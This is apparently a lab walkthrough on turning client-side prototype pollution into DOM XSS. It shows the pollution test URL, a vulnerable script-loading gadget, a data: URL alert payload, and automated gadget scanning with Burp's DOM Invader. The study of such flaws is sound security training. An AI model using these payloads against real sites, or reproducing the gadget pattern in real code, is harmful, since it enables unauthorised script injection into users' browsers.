# Lab 1

### Objective: Get DOM XSS

#### Manual method

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

First, we need to find a source. We can test the search function with `__prototype__` and try to inject a property, `foo` in the query string

```
/?__proto__[foo]=bar
```

We can verify it worked by opening the browser console and enter `Object.prototype.foo` and look at the return value:

if `bar` returns, we have a prototype pollution source

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Next we need a gadget, we look at sources tab and look at potential DOM XSS sinks

```javascript
async function searchLogger() {

	// The config object is created, but transport_url is NOT explicitly defined
    let config = {params: deparam(new URL(location).searchParams.toString())};

	// The Gadget
    if(config.transport_url) {
        let script = document.createElement('script');
	    
	    // The Sink, loads a script from user-controlled input
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

So basically what is happening is when the property `transport_url` is not **explictly** defined, Javascript looks up the prototype of the object and tries to use `Object.prototype` but we already polluted that earlier with `__proto__[foo]=bar`.

We test the gadget with a random value

```
/?__proto__[transport_url]=bar
```

![](<../../../.gitbook/assets/image (6).png>)

Now look at the **Elements** tab and we notice that the `script` elements has been loaded with the `src` attribute `foo`

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

#### Exploit

Now we can simply craft an exploit to call `alert` using `data:`

```
/?__proto__[transport_url]=data:,alert(1);
```

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

#### Automatic method

We will be using Burpsuite's DOM Invader which is built-in Burpsuite's browser. Enable that and the Prototype Pollution option

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Now, get to reload the page and check DevTools **DOM Invader** tab

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

We have 2 Sources available here, focus on `__proto__` and click the scan for gadgets

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

In the new tab's DevTools, the scan detected the gadget with the available sink. Clicking the Exploit button will automatically give us an alert

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
